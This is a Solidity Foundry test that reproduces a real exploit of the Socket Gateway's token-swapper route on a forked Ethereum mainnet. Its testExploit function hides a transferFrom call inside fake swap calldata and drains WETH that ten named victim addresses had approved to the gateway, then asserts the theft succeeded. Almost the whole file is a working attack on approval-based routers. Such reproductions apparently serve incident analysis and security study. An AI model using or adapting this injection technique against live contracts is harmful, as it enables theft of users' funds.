// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "./BaseTest.t.sol";




// 
// Attacker : https://etherscan.io/address/0x50DF5a2217588772471B84aDBbe4194A2Ed39066
// Attack Contract : https://etherscan.io/address/0x3a23F943181408EAC424116Af7b7790c94Cb97a5
// Vulnerable Contract : https://etherscan.io/address/0xcc5fda5e3ca925bd0bb428c8b2669496ee43067e
// Attack Tx : https://etherscan.io/tx/0x591d054a9db63f0976e533f447df482bed5f24d7429646570b2108a67e24ce54
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xcc5fda5e3ca925bd0bb428c8b2669496ee43067e#code#F1#L71


interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external;
    function allowance(address owner, address spender) external view returns (uint256);
}

interface ISocketGateway {
        function getRoute(uint32 routeId) external view returns (address);
        function executeRoute( uint32 routeId, bytes calldata routeData) external payable returns (bytes memory);
        function routesCount() external returns (uint32);
}

contract SocketHack is BaseTestWithBalanceLog {
    // Block Number before the hack occurs
    uint256 private constant forkBlockNumber = 19_021_464; 

    // Socket Contract that serve as entry point to make the attack possible
    ISocketGateway private constant socketGateway = ISocketGateway(0x3a23F943181408EAC424116Af7b7790c94Cb97a5);

    // The Router Id for router implementation address
    uint32 private constant routeId = 406; 

    // Socket Admin EOA address
    address private constant SocketOwner = 0xB0BBff6311B7F245761A7846d3Ce7B1b100C1836;

    // // Address of 10 / 307 victims in this exploit
    // address private constant victim_1 = 0xECaA643997033B1bA605D32748cfE9bdAd141880;
    // address private constant victim_2 = 0x33D66941465ac776C38096cb1bc496C673aE7390;
    // address private constant victim_3 = 0xa747C585C81a840Bb168B238231E685D9bf14430;
    // address private constant victim_4 = 0x8d98F2bCaF61811A2cc813a4dB65286b5DB785F6;
    // address private constant victim_5 = 0x3aA7bF72Ca377e859E06338A14fa5520aB320f04;
    // address private constant victim_6 = 0x6123dcf799451B1f9e2e8A39B3C69Fd81d637aBB;
    // address private constant victim_7 = 0x49a1c0e164Dd423bB108804CCCb5BC4b74732A43;
    // address private constant victim_8 = 0x84912149f93D963ad5Ddc3c2781B1950d160a4DA;
    // address private constant victim_9 = 0xAbc3C3B5B68C65b9E690340b054650EecACAe03E;
    // address private constant victim_10 = 0x962E3dc407474066d9dDC03f9F68F94a45192170;

    // Array of 10 victim addresses (out of 307 total in the exploit)
    address[] private victims = [
        0xECaA643997033B1bA605D32748cfE9bdAd141880,
        0x33D66941465ac776C38096cb1bc496C673aE7390,
        0x8d98F2bCaF61811A2cc813a4dB65286b5DB785F6,
        0x3aA7bF72Ca377e859E06338A14fa5520aB320f04,
        0x6123dcf799451B1f9e2e8A39B3C69Fd81d637aBB,
        0x49a1c0e164Dd423bB108804CCCb5BC4b74732A43,
        0x84912149f93D963ad5Ddc3c2781B1950d160a4DA,
        0xAbc3C3B5B68C65b9E690340b054650EecACAe03E,
        0xa747C585C81a840Bb168B238231E685D9bf14430,
        0x962E3dc407474066d9dDC03f9F68F94a45192170
        
    ];
    

    // Tokens involve for the exploit
    IERC20 private constant Weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    address private constant Ether = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    // The Attacker's address 
    address private constant Attacker = 0x50DF5a2217588772471B84aDBbe4194A2Ed39066;
    
    // Address to fake Weth Zero amount swap
    address private constant DummyAddress = 0x856da0aCbfF24Fd61A470023E8A5dAE8FC45bde8;

    bytes32 metadata = 0x0000000000000000000000000000000000000000000000000000000000001b3b;


    
    function setUp() public {
        vm.createSelectFork("mainnet", forkBlockNumber);  
    }

    //Check to confirm the router id holds the correct router implementation that cause the attack.
    function testCheck() public {
        address expectedAddress = 0xCC5fDA5e3cA925bd0bb428C8b2669496eE43067e; //WrappedTokenSwapperImpl

        vm.prank(SocketOwner);
        address RouterAddress = socketGateway.getRoute(routeId);

        assertEq(expectedAddress, RouterAddress);

        console.log("Recurrent routeId: ", socketGateway.routesCount());
    
    }

    function testExploit() public {
        // The attacker initial Weth to before hack
        uint AttackerInitialBalance = Weth.balanceOf(Attacker);
        console.log("Attacker initial balance: ", AttackerInitialBalance);
        console.log("///////////////////////////////////////////////////////////////////////");

        uint totalStolenWeth;

        for(uint256 i; i < victims.length; i++) {

            uint victimInitialBalance = Weth.balanceOf(victims[i]); // Victim's Weth token balance before the hack
            uint victimAllowanceToSocket = Weth.allowance(victims[i], address(socketGateway)); // The Amount of allowance the victim give the socket contract

            console.log("The Victim Balance before the hack: ", victimInitialBalance);
            console.log("The allowance victim give the socketGateway: ", victimAllowanceToSocket);
            console.log("///////////////////////////////////////////////////////////////////////");

            //Record all stolen asset 
            totalStolenWeth += victimInitialBalance;

            // The corrupt bytes craft steal victim token
            bytes memory swapExtraData = abi.encodeWithSelector(
            bytes4(keccak256("transferFrom(address,address,uint256)")),
            victims[i],
            Attacker,
            victimInitialBalance
            );
            
            // The calldata used to fake swap of Weth to Ether
            bytes memory data = abi.encodeWithSelector(
                bytes4(keccak256("performAction(address,address,uint256,address,bytes32,bytes)")),
                Weth,
                Ether,
                0,
                DummyAddress,
                metadata,
                swapExtraData // It's in the corrupt calldata
            );

            vm.prank(Attacker);
            socketGateway.executeRoute(routeId, data);

            // Victim balance after being hacked.
            uint victimAfterBalance = Weth.balanceOf(victims[i]);
            console.log("The victim Balance after hack: ", victimAfterBalance);
            console.log("///////////////////////////////////////////////////////////////////////");

            // Confirm if users funds is drained
            assertEq(victimAfterBalance, 0); 

        }

        // The attacker Weth balance to after the hack
        uint AttackerAfterBalance = Weth.balanceOf(Attacker);
        console.log("///////////////////////////////////////////////////////////////////////");
        console.log("Attacker initial balance: ", AttackerAfterBalance);

        // Confirm the attacker recieved all the stolen aitht
        assertEq(AttackerAfterBalance, AttackerInitialBalance + totalStolenWeth);
    }

}